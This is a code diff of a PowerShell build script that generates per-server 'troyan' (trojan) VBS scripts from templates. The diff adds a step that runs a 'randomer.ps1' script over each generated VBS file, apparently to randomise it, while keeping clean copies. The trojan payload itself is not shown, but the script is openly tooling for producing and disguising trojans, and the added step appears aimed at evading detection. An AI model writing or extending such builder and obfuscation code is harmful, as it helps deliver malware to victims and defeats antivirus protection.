@@ -1,6 +1,7 @@
 param (
     [string]$serverName
 )
+
 if ([string]::IsNullOrEmpty($serverName)) {
         throw "-serverName argument is null"
 }
@@ -118,6 +119,8 @@ $result = $result -replace '"__backName"', $name
 
 $result | Set-Content $server.troyanVbsFile
 Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFile -Force
+Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFileClean -Force
+& (Join-Path -Path $scriptDir -ChildPath "randomer.ps1") -inputFile $server.userVbsFile -outputFile $server.userVbsFile  -fileType vbs
 Remove-Item $server.troyanVbsFile
 
 
@@ -129,4 +132,6 @@ $result = $result -replace '0102', $body
 
 $result | Set-Content $server.troyanLiteVbsFile
 Copy-Item -Path $server.troyanLiteVbsFile -Destination $server.userLiteVbsFile -Force
+Copy-Item -Path $server.troyanLiteVbsFile -Destination $server.userLiteVbsFileClean -Force
+& (Join-Path -Path $scriptDir -ChildPath "randomer.ps1") -inputFile $server.userLiteVbsFile -outputFile  $server.userLiteVbsFile -fileType vbs
 Remove-Item $server.troyanLiteVbsFile
